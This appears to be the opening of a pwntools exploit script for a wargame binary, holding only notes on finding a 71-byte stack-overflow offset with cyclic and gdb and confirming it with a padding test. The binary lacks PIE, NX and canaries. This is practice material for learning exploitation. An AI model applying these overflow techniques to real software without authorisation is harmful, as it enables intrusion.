from pwn import *

'''
local exploit:
    cyclic 150
Then give the output to the program in gdb. Next, you'll get the offset of 71 bytes.
Checking:
    r < <(python -c 'print "A" * 71 + "B"*4')
Working.
Binary is without PIE, NX, Canary and so on.
So, it is just a usual stack overflow thing, but without source file as in the narnia serial.
'''
